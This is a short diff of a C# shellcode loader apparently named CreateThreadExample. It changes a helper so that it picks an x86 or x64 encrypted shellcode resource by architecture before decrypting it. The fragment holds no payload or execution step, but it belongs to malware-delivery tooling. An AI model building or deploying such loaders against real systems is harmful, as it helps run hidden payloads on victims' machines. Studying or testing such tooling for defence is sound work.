@@ -98,11 +98,21 @@ namespace CreateThreadExample
 
         #region Helper Functions
 
-        public static byte[] GetAllDecryptedBytes()
+        public static byte[] GetAllDecryptedBytes(string arch)
         {
             // You'll need to ensure you have the encrypted shellcode
             // added as an embedded resource.
-            byte[] rawData = Properties.Resources.encrypted;
+            byte[] rawData;
+            if (arch == "x86")
+            {
+                rawData = Properties.Resources.encrypted_x86;
+            }
+            else
+            {
+                rawData = Properties.Resources.encrypted_x64;
+            }
+            
+                
             byte[] result = new byte[rawData.Length];
             int j = 0;
 
